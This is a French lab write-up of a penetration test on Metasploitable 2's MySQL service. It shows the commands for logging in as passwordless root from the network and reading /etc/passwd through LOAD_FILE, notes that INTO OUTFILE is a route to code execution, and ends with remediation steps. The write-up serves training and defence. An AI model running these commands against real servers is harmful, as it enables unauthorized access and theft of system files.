MySQL 5.0.51a — root sans mot de passe

Identifiants par défaut + privilège FILE → lecture de fichiers arbitraires

Service / PortMySQL — port 3306
CibleMetasploitable 2 — 192.168.56.101
FaiblesseCompte root sans mot de passe, accessible à distance (root@%)
RésultatContrôle total de la base + lecture arbitraire de fichiers (privilège FILE)
Testé parZANNOU Josaphat

1. Identification

Le serveur MySQL accepte le compte root sans mot de passe depuis n'importe quelle machine (root@%), avec tous les privilèges. Ce n'est pas une faille logicielle mais une configuration par défaut dangereuse : pas de mot de passe administrateur, écoute ouverte sur le réseau. Le scan identifie la version.

2. Accès — identifiants par défaut

Le client MySQL récent tente d'abord une connexion chiffrée (TLS) que ce serveur ancien ne gère pas (ERROR 2026 TLS/SSL error) ; on la désactive avec --skip-ssl. Le compte root se connecte alors sans mot de passe :

$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
VERSION()
5.0.51a-3ubuntu5
CURRENT_USER()
root@%

root@% signifie que le compte administrateur est autorisé depuis n'importe quelle adresse IP. Tenter root:root échoue (« using password: YES ») : le mot de passe n'est pas « root », il est tout simplement vide.

3. Démarche d'exploitation — privilège FILE

On vérifie d'abord les privilèges du compte :

$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();"
Grants for root@%
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION

ALL PRIVILEGES inclut le privilège FILE, qui autorise la lecture (et l'écriture) de fichiers du système directement en SQL. On lit un fichier arbitraire avec LOAD_FILE :

$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
Lecture du fichier /etc/passwd complet via SQL — liste de tous les comptes système (msfadmin, user, service…), utile pour cibler ensuite un bruteforce SSH/Telnet. Le privilège FILE autorise aussi l'écriture (INTO OUTFILE), voie possible vers l'exécution de code.

4. Preuve d'accès obtenu

Trois éléments établissent le contrôle total : connexion root@% sans mot de passe, ALL PRIVILEGES, et lecture effective de /etc/passwd par LOAD_FILE. L'attaquant dispose de la base entière et peut lire des fichiers du système cible, sans aucun identifiant.

5. Remédiation

RECOMMANDATIONS
  • Définir un mot de passe fort pour root et supprimer les comptes anonymes/invités (mysql_secure_installation).
  • Restreindre root à localhost (supprimer root@%) et n'exposer 3306 qu'aux hôtes applicatifs légitimes (pare-feu / bind-address).
  • Retirer le privilège FILE des comptes qui n'en ont pas besoin et positionner secure_file_priv pour cloisonner les accès fichiers.
  • Mettre à jour vers une version MySQL/MariaDB maintenue (5.0 est obsolète).
